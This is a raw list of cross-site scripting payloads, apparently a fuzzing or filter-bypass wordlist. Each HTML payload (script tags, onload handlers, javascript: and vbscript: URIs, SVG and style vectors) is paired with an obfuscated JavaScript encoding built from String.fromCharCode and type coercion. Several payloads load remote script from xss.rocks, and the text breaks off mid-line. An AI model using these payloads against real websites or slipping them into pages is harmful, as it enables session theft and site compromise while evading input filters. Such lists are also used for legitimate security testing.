String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+([][""]+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=prompt(43)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(33)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(36)")()+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+([false]+"")[11]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(42)")()+[]["constructor"]["constructor"]("return String.fromCharCode(126)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(63)")()+[]["constructor"]["constructor"]("return String.fromCharCode(64)")()+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(124)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(96)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+([][""]+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<<SCRIPT>prompt(47);//\<</SCRIPT>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+([][""]+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(63)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+[0]+"")[7]+([][""]+"")[2]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<SCRIPT SRC=//xss.rocks/.j>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+([][""]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG SRC="`<javascript:prompt>`(53)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(96)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(96)")()+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
\";prompt(55);//
[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()
</script><script>prompt(57);</script>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
</TITLE><SCRIPT>prompt(59);</SCRIPT>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(true+"")[0]+([false]+"")[10]+(true+"")[0]+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<INPUT TYPE="IMAGE" SRC="javascript:prompt(61);">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(undefined+"")[0]+(true+"")[0]+(false+[0]+"")[7]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(false+[0]+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<BODY BACKGROUND="javascript:prompt(63)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+[0]+"")[7]+([][""]+"")[2]+(false+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(false+[0]+"")[2]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(undefined+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG DYNSRC="javascript:prompt(65)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(undefined+"")[1]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG LOWSRC="javascript:prompt(67)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<STYLE>li {list-style-image: url("javascript:prompt(69)");}</STYLE><UL><LI>XSS-69</br>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(false+"")[2]+([false]+"")[10]+(false+[0]+"")[7]+([false]+"")[15]+(false+"")[2]+([false]+"")[10]+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(false+[0]+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(false+[0]+"")[7]+(undefined+"")[0]+(true+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+([false]+"")[16]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[2]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(undefined+"")[0]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[2]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+"")[3]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+([][""]+"")[2]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<IMG SRC='vbscript:msgbox(71)'>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([][""]+"")[2]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[3]+(false+[0]+"")[2]+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg/onload=prompt(73)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
Set.constructor`prompt\x2875\x29`
(false+"")[3]+(true+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[3]+(true+"")[0]+(true+"")[1]+(undefined+"")[0]+([false]+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(96)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(96)")()
<BODY ONLOAD=prompt(77)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<BGSOUND SRC="javascript:prompt(79);">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([][""]+"")[2]+(false+[0]+"")[2]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(undefined+"")[1]+([][""]+"")[4]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return 